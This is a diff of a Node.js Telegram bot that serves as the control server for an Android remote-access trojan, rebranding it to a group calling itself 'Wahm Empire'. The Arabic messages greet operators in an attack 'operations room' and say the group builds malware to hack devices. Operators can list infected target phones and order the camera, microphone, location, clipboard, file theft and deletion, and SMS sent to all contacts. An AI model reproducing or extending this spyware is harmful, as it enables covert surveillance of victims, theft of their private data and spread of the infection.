@@ -1,7 +1,7 @@
 const express = require('express');
 const webSocket = require('ws');
 const http = require('http')
-const TelegramBot = require('node-telegram-bot-api').default;
+const telegramBot = require('node-telegram-bot-api')
 const uuid4 = require('uuid')
 const multer = require('multer');
 const bodyParser = require('body-parser')
@@ -14,7 +14,7 @@ const address = 'https://www.google.com'
 const app = express();
 const appServer = http.createServer(app);
 const appSocket = new webSocket.Server({server: appServer});
-const appBot = new TelegramBot(token, {polling: true});
+const appBot = new telegramBot(token, {polling: true});
 const appClients = new Map()
 
 const upload = multer();
@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">تم تشغيل البوت بنجاح بواسطة Eco يوزر المطور @KHAIN3 </h1>')
+    res.send('<h1 align="center">تم تشغيل البوت بنجاح بواسطة Wahm Empire | @HackWahm</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -80,7 +80,7 @@ appSocket.on('connection', (ws, req) => {
             `• موديل الجهاز : <b>${model}</b>\n` +
             `• البطارية : <b>${battery}</b>\n` +
             `• نظام الاندرويد : <b>${version}</b>\n` +
-            `• سطوح الشاشة معليش متزعل صيد غيره او تعا هنا  @KHAIN3 : <b>${brightness}</b>\n` +
+            `• سطوح الشاشة معليش متزعل صيد غيره او تعا هنا  @HackWahm : <b>${brightness}</b>\n` +
             `• مزود : <b>${provider}</b>`,
             {parse_mode: "HTML"}
         )
@@ -108,11 +108,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -128,11 +128,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -148,11 +148,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -168,11 +168,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -188,11 +188,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -208,11 +208,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -228,11 +228,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -248,11 +248,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -277,11 +277,11 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -297,30 +297,30 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
     }
-If (id == chatId) {
+    if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '⚠️ <b>[ النظام تحت السيطرة السيبرانية ]</b> ⚠️\n\n' +
-                '• أهلاً بك في البوت الرسمي لـ <b>Wahm Empire</b>.\n' +
-                '• تم اختراق دفاعات الهدف بنجاح وإقامة اتصال مشفر مع السيرفر الرئيسي.\n\n' +
-                '• الانتشار وجاهزية الأجهزة قيد المراقبة الآن.\n' +
-                '• اختر الأمر المناسب من لوحة التحكم أدناه للبدء في تنفيذ المهام.\n\n' +
-                '• المطور: <b>وهم</b> | يوزر: @HackWahm',
+                '🔥 <b>[ تم اختراق الجدار الناري بنجاح ]</b> 🔥\n\n' +
+                '⚡ أهلاً بك يا قائد في غرفة العمليات المركزية لـ <b>Wahm Empire</b>.\n' +
+                '🌐 تم تأمين الاتصال بالسيرفر الرئيسي عبر بروتوكولات مشفرة وغير قابلة للتتبع.\n\n' +
+                '🎯 <b>حالة النظام:</b> جميع الأهداف تحت المراقبة والاستعداد التام لتنفيذ الأوامر.\n' +
+                '🛡️ <b>السيادة السيبرانية:</b> مطلقة بالكامل.\n\n' +
+                'اختر من لوحة التحكم أدناه للبدء في الهجوم أو إدارة الأجهزة المخترقة 👇',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة", "تنفيذ الامر"], ["معلومات مطور"]],
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                         'resize_keyboard': true
                     }
                 }
@@ -329,57 +329,73 @@ If (id == chatId) {
         if (message.text == 'الاجهزة المتصلة') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                    '❌ <b>[ تحذير: لا توجد أهداف متصلة ]</b>\n\n' +
-                    '• لم يتم رصد أي أجهزة نشطة حالياً.\n' +
-                    '• تأكد من نجاح تثبيت ونشر الحزمة البرمجية على الجهاز المستهدف.'
+                    '°• لا توجد اجهزة متصلة حاليا\n\n' +
+                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف',
+                    {
+                        parse_mode: "HTML",
+                        "reply_markup": {
+                            "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
+                            'resize_keyboard': true
+                        }
+                    }
                 )
             } else {
-                let text = '⚡ <b>[ قائمة الأجهزة المخترقة والمتصلة ]</b> ⚡\n\n'
+                let text = '°• قائمة الاجهزة المتصلة :\n\n'
                 appClients.forEach(function (value, key, map) {
-                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
-                        `• البطارية : <b>${value.battery}</b>\n` +
-                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
-                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
-                        `• مزود : <b>${value.provider}</b>\n\n`
+                    text += `• موديل الجهاز : <b>${value.model}</b>\n• البطارية : <b>${value.battery}</b>\n• نظام الاندرويد : <b>${value.version}</b>\n\n`
                 })
-                appBot.sendMessage(id, text, {parse_mode: "HTML"})
+                appBot.sendMessage(id, text, {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
+                        'resize_keyboard': true
+                    }
+                })
             }
         }
-        if (message.text == 'معلومات مطور') {
-            appBot.sendMessage(id,
-                '𝐖𝐚𝐡𝐦 𝐄𝐦𝐩𝐢𝑟𝐞 </>\n\n' +
-                'نحن الجيش اليمني السيبراني نخترق\n' +
-                'نصنع برمجيات خبيثة لاختراق الأجهزة.\n\n' +
-                '𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @HackWahm',
-                { parse_mode: "HTML" }
-            )
-        }
-}
-
-
         if (message.text == 'تنفيذ الامر') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
-                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                    '°• لا توجد اجهزة متصلة حاليا\n\n' +
+                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف',
+                    {
+                        parse_mode: "HTML",
+                        "reply_markup": {
+                            "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
+                            'resize_keyboard': true
+                        }
+                    }
                 )
             } else {
-                const deviceListKeyboard = []
+                const deviceList = []
                 appClients.forEach(function (value, key, map) {
-                    deviceListKeyboard.push([{
+                    deviceList.push([{
                         text: value.model,
                         callback_data: 'device:' + key
                     }])
                 })
-                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
-                    "reply_markup": {
-                        "inline_keyboard": deviceListKeyboard,
-                    },
+                appBot.sendMessage(id, '°• اختر الجهاز الذي تريد التحكم به :', {
+                    reply_markup: {
+                        inline_keyboard: deviceList
+                    }
                 })
             }
         }
-    } else {
-        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
+        if (message.text == 'معلومات مطور') {
+            appBot.sendMessage(id,
+                '𝐖𝐚𝐡𝐦 𝐄𝐦𝐩𝐢𝐫𝐞 </>\n' +
+                'نحن الجيش اليمني السيبراني نخترق\n' +
+                'نصنع برمجيات خبيثة لاختراق الأجهزة.\n' +
+                '𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @Yemen_Sec',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
     }
 })
 appBot.on("callback_query", (callbackQuery) => {
@@ -387,137 +403,46 @@ appBot.on("callback_query", (callbackQuery) => {
     const data = callbackQuery.data
     const commend = data.split(':')[0]
     const uuid = data.split(':')[1]
-    console.log(uuid)
     if (commend == 'device') {
-        appBot.editMessageText(`📱 • لوحة تحكم الجهاز: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
-            width: 10000,
+        appBot.editMessageText('°• اختر الامر الذي تريد تنفيذه على الجهاز :', {
             chat_id: id,
             message_id: msg.message_id,
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: '📦 التطبيقات', callback_data: `apps:${uuid}`},
-                        {text: 'ℹ️ معلومات الجهاز', callback_data: `device_info:${uuid}`}
+                        {text: 'معلومات الجهاز', callback_data: 'device_info:' + uuid},
+                        {text: 'الحافظة', callback_data: 'clipboard:' + uuid}
                     ],
                     [
-                        {text: '📁 تصفح الملفات', callback_data: `file:${uuid}`},
-                        {text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}`}
+                        {text: 'الكاميرا الامامية', callback_data: 'camera_main:' + uuid},
+                        {text: 'كاميرا السلفي', callback_data: 'camera_selfie:' + uuid}
                     ],
                     [
-                        {text: '📋 الحافظة', callback_data: `clipboard:${uuid}`},
-                        {text: '🎙️ الميكروفون', callback_data: `microphone:${uuid}`},
+                        {text: 'الموقع', callback_data: 'location:' + uuid},
+                        {text: 'اهتزاز', callback_data: 'vibrate:' + uuid}
                     ],
                     [
-                        {text: '📷 الكاميرا الخلفية', callback_data: `camera_main:${uuid}`},
-                        {text: '🤳 الكاميرا الأمامية', callback_data: `camera_selfie:${uuid}`}
+                        {text: 'ارسال رسالة', callback_data: 'send_message:' + uuid},
+                        {text: 'ارسال للكل', callback_data: 'send_message_to_all:' + uuid}
                     ],
                     [
-                        {text: '📍 الموقع الجغرافي', callback_data: `location:${uuid}`},
-                        {text: '💬 إرسال إشعار Toast', callback_data: `toast:${uuid}`}
+                        {text: 'سحب ملف', callback_data: 'file:' + uuid},
+                        {text: 'حذف ملف', callback_data: 'delete_file:' + uuid}
                     ],
                     [
-                        {text: '📞 سجل المكالمات', callback_data: `calls:${uuid}`},
-                        {text: '📇 جهات الاتصال', callback_data: `contacts:${uuid}`}
+                        {text: 'تسجيل صوت', callback_data: 'microphone:' + uuid},
+                        {text: 'تنبيه (Toast)', callback_data: 'toast:' + uuid}
                     ],
                     [
-                        {text: '📳 اهتزاز الجهاز', callback_data: `vibrate:${uuid}`},
-                        {text: '🔔 إظهار إشعار', callback_data: `show_notification:${uuid}`}
+                        {text: 'إظهار إشعار', callback_data: 'show_notification:' + uuid},
+                        {text: 'تشغيل صوت', callback_data: 'play_audio:' + uuid}
                     ],
                     [
-                        {text: '📩 الرسائل النصية', callback_data: `messages:${uuid}`},
-                        {text: '✉️ إرسال رسالة', callback_data: `send_message:${uuid}`}
-                    ],
-                    [
-                        {text: '🎵 تشغيل صوت', callback_data: `play_audio:${uuid}`},
-                        {text: '🔇 إيقاف الصوت', callback_data: `stop_audio:${uuid}`},
-                    ],
-                    [
-                        {
-                            text: '📢 إرسال رسالة لجميع جهات الاتصال',
-                            callback_data: `send_message_to_all:${uuid}`
-                        }
-                    ],
+                        {text: 'إيقاف الصوت', callback_data: 'stop_audio:' + uuid}
+                    ]
                 ]
-            },
-            parse_mode: "HTML"
+            }
         })
-    }
-
-    if (commend == 'calls') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('calls');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'contacts') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('contacts');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'messages') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('messages');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'apps') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('apps');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
     }
     if (commend == 'device_info') {
         appSocket.clients.forEach(function each(ws) {
@@ -528,11 +453,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
@@ -547,11 +472,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
@@ -566,11 +491,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
@@ -585,11 +510,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
@@ -604,11 +529,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
@@ -623,11 +548,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
@@ -642,11 +567,11 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور Eco ،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور @HackWahm ،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"], ["معلومات مطور"]],
                     'resize_keyboard': true
                 }
             }
